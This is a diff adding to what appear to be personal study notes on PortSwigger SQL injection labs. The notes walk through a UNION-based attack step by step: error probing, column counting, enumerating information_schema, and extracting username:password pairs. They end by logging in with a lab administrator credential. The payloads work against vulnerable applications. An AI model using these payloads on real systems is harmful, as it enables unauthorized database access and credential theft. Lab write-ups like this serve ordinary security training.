@@ -244,7 +244,8 @@
 <img width="1120" height="466" alt="image" src="https://github.com/user-attachments/assets/20d07fc4-bd82-4642-8d88-96e4e3406601" />
 
 
-- finally we grab username and password values from the table
+- finally we grab username and password values from the table with `'union select USERNAME_JQLTVL,PASSWORD_IIYNGP from+USERS_PSGOIQ-- -`
+
 
 <img width="1125" height="350" alt="image" src="https://github.com/user-attachments/assets/08e058e1-f0e7-44fa-b58d-67ed9ef9100d" />
 
@@ -254,11 +255,42 @@
 
 <img width="925" height="341" alt="image" src="https://github.com/user-attachments/assets/07dcf036-f595-4831-baa4-cc0f9e137c63" />
 
+
 ---
 
 
+<img width="632" height="441" alt="image" src="https://github.com/user-attachments/assets/1c06706c-b9da-404d-bd5a-ef659f0077fe" />
 
 
+//LAB: SQL injection UNION attack, retrieving multiple values in a single column
+
+
+- again first add `'` -- and got 500 error
+- add comment `-- -` -- and we get 200 OK back -- so we can control this param
+- now find out number of columns with `'union select null,null` -- get 200OK
+- add another `null` and got 500 error -- so there's 2 columns
+- now find out table_name that should contain user creds with `'union select null,table_name from information_schema.tables-- -`
+
+<img width="1132" height="331" alt="image" src="https://github.com/user-attachments/assets/8deec7d6-7b71-4b50-be2a-2a917f841279" />
+
+- then find out columns with `'union select null,column_name from information_schema.columns where table_name='users'-- -`
+
+<img width="1122" height="463" alt="image" src="https://github.com/user-attachments/assets/fa756067-c90a-4ce3-92b3-8fe5f4bd96f5" />
+
+- now get the values in username and password columns
+- using this command `'union select null,username || ':' || password from users-- -`
+- NOTE that we're using only 1 column to return more than 1 value
+- using the || to concatenate strings per `https://portswigger.net/web-security/sql-injection/cheat-sheet`
+
+<img width="1125" height="468" alt="image" src="https://github.com/user-attachments/assets/8e2d8c8e-574c-41b2-b00a-f16588c2e3cc" />
+
+
+- finally simply log in with `administrator:cam1hq3oi2kse5q0ekhl`
+- and lab solved
+
+<img width="916" height="332" alt="image" src="https://github.com/user-attachments/assets/bcb9efd9-1c58-41e9-826a-84b1d8aa2ebd" />
+
+---
 
 
 
